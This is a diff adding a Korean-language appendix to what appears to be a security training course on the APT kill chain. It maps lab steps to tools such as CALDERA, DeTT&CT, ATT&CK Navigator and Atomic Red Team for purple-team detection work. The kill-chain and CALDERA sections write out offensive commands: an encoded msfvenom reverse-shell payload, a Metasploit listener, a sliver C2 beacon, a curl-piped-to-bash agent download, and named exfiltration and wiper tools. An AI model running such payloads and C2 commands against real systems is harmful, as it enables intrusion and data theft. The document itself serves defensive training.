@@ -909,3 +909,264 @@ graph LR
 
 **학생 액션**: Diamond Model 로 group 분석.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course12 Battle Advanced — Week 01 APT 킬체인)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | MITRE ATT&CK 카탈로그 | **MITRE ATT&CK Navigator** |
+| s2 | Lockheed Cyber Kill Chain | (개념적 — 도구 적용 매핑) |
+| s3 | Unified Kill Chain | UnifiedKillChain.com (참고) |
+| s4 | DeTT&CT (커버리지) | **DeTT&CT** (Rabobank) |
+| s5 | CALDERA (시뮬) | **CALDERA** (MITRE) |
+| s6 | APT 프로파일 | CALDERA built-in 50+ |
+| s7 | Adversary YAML 작성 | CALDERA adversary file |
+| s8 | TTP 매핑 검증 | DeTT&CT + Navigator |
+
+### 학생 환경 준비
+
+```bash
+# === ATT&CK Navigator (시각화) ===
+git clone https://github.com/mitre-attack/attack-navigator ~/navigator
+cd ~/navigator/nav-app
+npm install
+npm run build
+npm run start                                              # http://localhost:4200
+
+# === CALDERA (adversary emulation) ===
+git clone https://github.com/mitre/caldera --recursive ~/caldera
+cd ~/caldera && pip install -r requirements.txt
+python3 server.py --insecure                              # http://localhost:8888
+
+# === DeTT&CT ===
+git clone https://github.com/rabobank-cdc/DeTTECT ~/dettect
+cd ~/dettect && pip install -r requirements.txt
+python3 dettect.py editor                                 # http://localhost:8080
+
+# === Atomic Red Team (T-code 기반) ===
+git clone https://github.com/redcanaryco/atomic-red-team ~/atomic
+sudo invoke install-atomicredteam
+```
+
+### Lockheed Cyber Kill Chain (7 단계)
+
+```bash
+# 1. Reconnaissance (정찰)
+#    도구: nmap, theHarvester, SpiderFoot, sherlock
+nmap -sV -p- 10.20.30.80
+theHarvester -d target.com -b all
+spiderfoot-cli -s target.com -t DOMAIN_NAME
+
+# 2. Weaponization (무기화)
+#    도구: msfvenom, shellter, sliver
+msfvenom -p linux/x64/shell_reverse_tcp \
+    LHOST=192.168.0.112 LPORT=4444 \
+    -e x86/shikata_ga_nai -i 10 \
+    -f elf -o /tmp/payload.elf
+
+# 3. Delivery (전달)
+#    도구: gophish (phish), web hosting (Apache), USB drop
+sudo apt install -y gophish
+sudo /opt/gophish/gophish &                                # http://localhost:3333
+
+# 4. Exploitation (취약점 악용)
+#    도구: metasploit, sqlmap, XSStrike
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 192.168.0.112; set LPORT 4444; exploit -j"
+
+# 5. Installation (설치)
+#    도구: sliver, mythic, weevely
+sliver-server &
+sliver > generate beacon --mtls 192.168.0.112:443
+
+# 6. Command & Control (C2)
+#    도구: sliver / mythic / havoc / metasploit handler
+sliver > sessions
+sliver > use <session-id>
+sliver > shell
+
+# 7. Actions on Objectives (목표 달성)
+#    Exfil: iodine, dnscat2, age, rclone
+#    Wiper: shred, rm -rf
+```
+
+### MITRE ATT&CK Tactics (14개)
+
+| Tactic | 도구 |
+|--------|------|
+| TA0043 Reconnaissance | nmap, theHarvester, sherlock |
+| TA0042 Resource Development | gophish, msfvenom |
+| TA0001 Initial Access | sqlmap, hydra, gophish |
+| TA0002 Execution | msfconsole, sliver, pwncat-cs |
+| TA0003 Persistence | crontab, systemd, weevely |
+| TA0004 Privilege Escalation | LinPEAS, GTFOBins |
+| TA0005 Defense Evasion | shellter, msfvenom -e, shred |
+| TA0006 Credential Access | mimikatz/pypykatz, hashcat, jwt_tool |
+| TA0007 Discovery | LinPEAS, BloodHound |
+| TA0008 Lateral Movement | impacket, chisel, evil-winrm |
+| TA0009 Collection | curl, tar |
+| TA0011 Command and Control | sliver, mythic, havoc |
+| TA0010 Exfiltration | iodine, dnscat2, age, rclone |
+| TA0040 Impact | shred, ransomware sim |
+
+### CALDERA APT 시뮬 (자동)
+
+```bash
+# 1) 서버 시작 + Web UI
+cd ~/caldera
+python3 server.py --insecure
+# http://localhost:8888 (admin/admin)
+
+# 2) Adversary profile (built-in 50+)
+# - APT29 (SolarWinds, Cozy Bear)
+# - APT41 (China, Winnti)
+# - Lazarus (NK)
+# - FIN7 (Carbanak)
+# - Conti (Ransomware)
+# - Wizard Spider
+
+# 3) Sandcat agent 배포 (모든 endpoint)
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
+    http://caldera:8888/file/download | bash
+
+# 4) Operation 시작 (REST API)
+curl -X POST http://localhost:8888/api/v2/operations \
+    -H "KEY: ADMIN123" \
+    -d '{
+        "name": "APT29 Simulation",
+        "adversary": {"adversary_id": "0f4c3c67-845e-49a0-927e-90ed33c044e0"},
+        "group": "linux",
+        "planner": {"planner_id": "atomic"},
+        "auto_close": false
+    }'
+
+# 5) 자동 다단계 실행:
+# Phase 1 — Discovery
+#   T1083 (File/Directory Discovery)
+#   T1057 (Process Discovery)
+#   T1018 (Remote System Discovery)
+# Phase 2 — Defense Evasion
+#   T1027 (Obfuscated Files or Information)
+#   T1070 (Indicator Removal)
+# Phase 3 — Credential Access
+#   T1003.001 (LSASS Memory Dump)
+#   T1003.008 (/etc/passwd /etc/shadow)
+# Phase 4 — Lateral Movement
+#   T1021.001 (Remote Desktop)
+#   T1021.004 (SSH)
+# Phase 5 — Collection
+#   T1005 (Data from Local System)
+#   T1039 (Data from Network Share)
+# Phase 6 — Exfiltration
+#   T1041 (Exfil Over C2)
+
+# 6) 결과 export
+curl http://localhost:8888/api/v2/operations -H "KEY: ADMIN123" | \
+    jq '.[] | {name, state, completed_tasks: (.completed_tasks | length)}'
+```
+
+### DeTT&CT (Detection Coverage 측정)
+
+```bash
+cd ~/dettect
+
+# 1) Web editor 시작
+python3 dettect.py editor                                 # http://localhost:8080
+
+# 2) Data Sources mapping (어떤 로그/시그널 가능?)
+# Web UI 에서 정의:
+# - process_creation: ✓ (Falco)
+# - command_line: ✓ (auditd)
+# - authentication_log: ✓ (Wazuh)
+# - network_traffic: ✓ (Suricata, Zeek)
+# - file_modification: ✓ (Wazuh FIM, AIDE)
+# - dns_query: ✓ (Suricata, Zeek)
+
+# 3) Visibility Score (각 ATT&CK technique 별)
+# 0: No visibility
+# 1: Some indicators (low)
+# 2: Most indicators (medium)
+# 3: Comprehensive (high)
+
+# 4) Detection rules mapping
+# - Sigma rules → ATT&CK 자동 매핑
+# - Custom Wazuh rules → mitre_id 필드
+
+# 5) Gap analysis
+python3 dettect.py d -fd /opt/data-sources.yaml \
+    --output-filename /tmp/dataSourceMatrix.json
+
+python3 dettect.py de -ft /opt/techniques.yaml \
+    --output-filename /tmp/techniqueMatrix.json
+
+# 6) ATT&CK Navigator JSON export (시각화)
+# Navigator 에서 import → heat map
+# - Red: 탐지 불가
+# - Yellow: 부분
+# - Green: 완전 cover
+```
+
+### Adversary YAML 자체 작성 (Custom APT)
+
+```yaml
+# ~/caldera/data/adversaries/custom-apt-2026.yml
+id: custom-apt-2026
+name: 자체 위협 시나리오 (한국 금융)
+description: |
+  Phishing → Local exploitation → Lateral → AD compromise → Exfil
+
+atomic_ordering:
+  # === Phase 1: Initial Access ===
+  - 6f4ff2b6-5e0e-4b3f-9e0e-1234567890ab            # T1566.001 Phishing Attachment
+  - 7f4ff2b6-5e0e-4b3f-9e0e-1234567890ac            # T1078 Valid Accounts
+  
+  # === Phase 2: Execution ===
+  - 8f4ff2b6-5e0e-4b3f-9e0e-1234567890ad            # T1059.003 PowerShell
+  - 9f4ff2b6-5e0e-4b3f-9e0e-1234567890ae            # T1059.004 Bash
+  
+  # === Phase 3: Persistence ===
+  - af4ff2b6-5e0e-4b3f-9e0e-1234567890af            # T1547.001 Boot/Logon Autostart
+  - bf4ff2b6-5e0e-4b3f-9e0e-1234567890b0            # T1098 Account Manipulation
+  
+  # === Phase 4: Privilege Escalation ===
+  - cf4ff2b6-5e0e-4b3f-9e0e-1234567890b1            # T1548.003 Sudo and Sudo Caching
+  - df4ff2b6-5e0e-4b3f-9e0e-1234567890b2            # T1068 Exploitation for Privilege Escalation
+  
+  # === Phase 5: Credential Access ===
+  - ef4ff2b6-5e0e-4b3f-9e0e-1234567890b3            # T1003.008 /etc/passwd
+  - ff4ff2b6-5e0e-4b3f-9e0e-1234567890b4            # T1110.003 Password Spraying
+  
+  # === Phase 6: Lateral Movement ===
+  - 1f4ff2b6-5e0e-4b3f-9e0e-1234567890b5            # T1021.004 SSH
+  - 2f4ff2b6-5e0e-4b3f-9e0e-1234567890b6            # T1021.001 Remote Desktop Protocol
+  
+  # === Phase 7: Collection ===
+  - 3f4ff2b6-5e0e-4b3f-9e0e-1234567890b7            # T1005 Data from Local System
+  
+  # === Phase 8: Exfiltration ===
+  - 4f4ff2b6-5e0e-4b3f-9e0e-1234567890b8            # T1041 Exfil Over C2
+  - 5f4ff2b6-5e0e-4b3f-9e0e-1234567890b9            # T1048.003 Exfil Over Unencrypted/Obfuscated
+```
+
+### Purple Team Cycle (학생 목표)
+
+```
+1. CALDERA Operation 시작 (custom-apt-2026)
+   ↓
+2. Blue 측 Sigma + chainsaw + Wazuh 가 탐지 시도
+   ↓
+3. DeTT&CT 으로 detection coverage 측정
+   - Detected (탐지된 technique)
+   - Missed (탐지 안 된 technique)
+   ↓
+4. Gap 분석 → 새 Sigma rule 작성
+   ↓
+5. Wazuh / Suricata 에 자동 배포
+   ↓
+6. 재시뮬 → coverage 측정 → 95%+ 목표
+```
+
+학생은 본 1주차에서 **MITRE ATT&CK Navigator + DeTT&CT + CALDERA + Atomic Red Team** 4 도구로 APT 킬체인의 14 tactics 매핑 + 자동 시뮬 + coverage 측정 + Purple team cycle 의 advanced 운영을 OSS 도구로 익힌다.
